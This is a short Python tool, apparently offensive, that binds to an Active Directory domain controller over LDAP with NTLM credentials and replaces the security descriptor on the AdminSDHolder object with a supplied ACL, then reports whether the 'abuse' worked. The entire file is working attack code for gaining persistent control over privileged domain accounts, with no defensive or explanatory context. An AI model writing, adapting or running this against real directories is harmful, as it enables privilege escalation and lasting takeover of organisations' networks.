import ldap3

class AdminSDHolderAbuser:
    def __init__(self, config, verbose=False):
        self.config = config
        self.verbose = verbose

    def abuse(self):
        server = ldap3.Server(self.config["ldap_server"], get_info=ldap3.ALL)
        conn = ldap3.Connection(
            server,
            user=self.config["bind_dn"],
            password=self.config["password"],
            authentication=ldap3.NTLM,
            auto_bind=True
        )

        sdholder_dn = self.config.get("sdholder_dn", "CN=AdminSDHolder,CN=System," + self.config["base_dn"])
        acl_blob = self.config["acl"]

        if self.verbose:
            print(f"[INFO] Overwriting nTSecurityDescriptor on {sdholder_dn}")

        conn.modify(
            dn=sdholder_dn,
            changes={"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [acl_blob.encode()])]}
        )

        if conn.result["description"] == "success":
            print("[+] AdminSDHolder abuse successful")
        else:
            print(f"[-] Abuse failed: {conn.result}")
        conn.unbind()
